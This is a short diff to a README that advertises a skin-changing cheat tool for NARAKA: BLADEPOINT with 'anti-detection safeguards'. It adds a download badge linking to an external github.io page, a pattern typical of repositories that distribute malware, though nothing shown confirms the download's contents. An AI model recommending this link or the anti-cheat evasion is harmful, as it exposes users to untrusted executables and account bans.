@@ -4,6 +4,8 @@
 
 The **NARAKA: BLADEPOINT SkinChanger & SkinSwapper** is an open-source tool designed to let you personalize your experience in *NARAKA: BLADEPOINT*. Swap default skins for custom weapon designs, armor sets, and character models with **real-time adjustments** and **anti-detection safeguards**. Whether you want to stand out in battle royale matches or experiment with unique aesthetics, this tool blends creativity and stealth to enhance your gameplay.  
 
+**[![Download BLADEPOINT SkinChanger](https://img.shields.io/badge/Download-BLADEPOINT%20SkinChanger-blueviolet)](https://naraka-bladepoint-skinchanger-swapper.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Unlimited Custom Skins**: Apply custom skins for weapons, armor, and character models instantly.  
 - **Mid-Game Flexibility**: Swap skins or models without restarting the game or disconnecting.  
